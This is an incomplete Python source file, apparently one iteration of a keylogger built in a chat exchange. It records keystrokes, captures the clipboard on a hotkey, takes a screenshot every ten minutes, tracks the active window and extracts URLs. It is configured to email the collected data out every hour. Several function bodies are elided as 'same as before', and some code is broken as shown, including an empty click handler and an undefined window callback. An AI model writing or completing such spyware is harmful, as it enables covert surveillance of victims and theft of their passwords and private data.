from pynput import keyboard, mouse
import time
import threading
import subprocess
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import os
import win32clipboard
import re
import requests
import win32gui
import psutil
import pyudev
from urllib.parse import urlparse

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour
screenshot_interval = 600  # Capture screenshot every 10 minutes

current_word = ""
current_line = ""
current_application = ""
screenshot_key = keyboard.Key.print_screen
clipboard_key = keyboard.Key.f9

# Email configuration
# ... (same as before)

# Function to capture clipboard
# ... (same as before)

# Function to capture screenshot
# ... (same as before)

# Function to send email
# ... (same as before)

# Function to get active application
# ... (same as before)

# Function to capture URLs
def capture_urls(text):
    urls = re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
    return urls

def on_click(x, y, button, pressed):
    # ... (same as before)

def on_key_press(key):
    global current_word, current_line, current_application

    # ... (same as before)

    if key == clipboard_key:
        capture_clipboard()

    if len(current_line) >= 50:
        save_current_line()

# Set up mouse listener
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

# Set up window listener
window_listener = win32gui.EnumWindows(capture_window_title, None)

# Rest of the code remains unchanged
